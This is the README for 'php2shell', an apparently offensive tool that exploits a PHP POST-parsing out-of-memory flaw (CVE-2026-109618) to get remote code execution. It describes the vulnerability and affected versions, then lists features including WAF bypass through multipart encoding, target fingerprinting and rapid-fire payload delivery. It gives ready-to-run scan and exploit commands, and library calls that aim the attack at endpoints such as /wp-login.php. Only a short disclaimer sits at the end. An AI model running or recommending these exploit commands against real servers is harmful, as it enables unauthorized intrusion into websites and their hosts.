# php2shell

<p align="center">
  <img src="assets/banner.webp" alt="php2shell" width="600">
</p>

**CVE-2026-109618** exploit tool — RCE via OOM ghost bucket in PHP POST parsing.

CVSS v4.0: **9.2 Critical** | GHSA-w8hw-w9fx-j79w

## The vulnerability

PHP's POST parser increments `nNumUsed++` and `nNumOfElements++` **before** initializing the bucket at `zend_string_init()`. An out-of-memory condition triggers `longjmp()` back to the executor, leaving a ghost bucket — allocated but uninitialized — in the `HashTable`.

Memory amplification is approximately **2x**: PHP holds the raw POST body AND creates parsed `zend_string` copies for each field.

### Affected versions

| Branch | Vulnerable | Fix |
|--------|-----------|-----|
| 8.5.x  | < 8.5.12  | 8.5.12 |
| 8.4.x  | < 8.4.27  | 8.4.27 |
| 8.3.x  | < 8.3.36  | 8.3.36 |
| 8.2.x  | < 8.2.35  | 8.2.35 |
| <= 8.1 | ALL       | EOL — no fix |

Fix commits: `01a40e89fb` / `3584a98bda0f` — `EG(delayed_oom)` state machine.

## Features

- **Auto-fingerprinting** — detects PHP version, SAPI, CMS (WordPress / Laravel / Backpack / Drupal), WAF, server limits
- **Auto-calibration** — computes payload parameters from detected target properties
- **Multipart encoding** — bypasses WAF rules matching urlencoded patterns
- **Keep-alive transport** — enables cross-request UAF on mod_php/FPM
- **Rapid-fire delivery** — multiple payloads on same connection for race conditions
- **Crash-based OOM detection** — estimates memory_limit when FPM/nginx returns 502/503
- **Version matrix** — covers PHP 8.2 through 8.5 plus all EOL branches
- **Zero dependencies** — stdlib only

## Install

```bash
pip install .
```

## Usage

### CLI

```bash
# Scan target (fingerprint + version check)
php2shell scan https://target.example.com

# Aggressive scan (error probing, OOM detection)
php2shell scan https://target.example.com -a

# Exploit with multipart encoding on a specific endpoint
php2shell exploit https://target.example.com -e /wp-login.php --encoding multipart

# Exploit with keep-alive for cross-request UAF
php2shell exploit https://target.example.com --keepalive

# Rapid-fire exploit (3 shots on same connection)
php2shell exploit https://target.example.com --rapid 3

# Full auto (aggressive scan + keep-alive + rapid-fire)
php2shell exploit https://target.example.com -a --keepalive --rapid 3

# Check if a PHP version is vulnerable
php2shell check 8.3.35

# List available presets
php2shell presets
```

### Library

```python
from php2shell import fingerprint, calibrate_for_target, deliver

target = fingerprint("https://target.example.com", aggressive=True)
preset = calibrate_for_target(target)
result = deliver(target, "/wp-login.php", preset)

print(result.summary)
```

## Testing

```bash
pip install pytest
python -m pytest tests/ -v
```

## Disclaimer

This tool was built for educational purposes and security research. Sometimes it works great, sometimes it doesn't — exploitation depends on target configuration, memory limits, and a dozen other moving parts. The author is not responsible for any use or misuse by third parties.

## Author

**Emanuele Guidi** — info@eguidi.com

Need help with this or security in general? Write me. My help isn't free, but it's worth it.

## License

MIT — see [LICENSE](LICENSE).
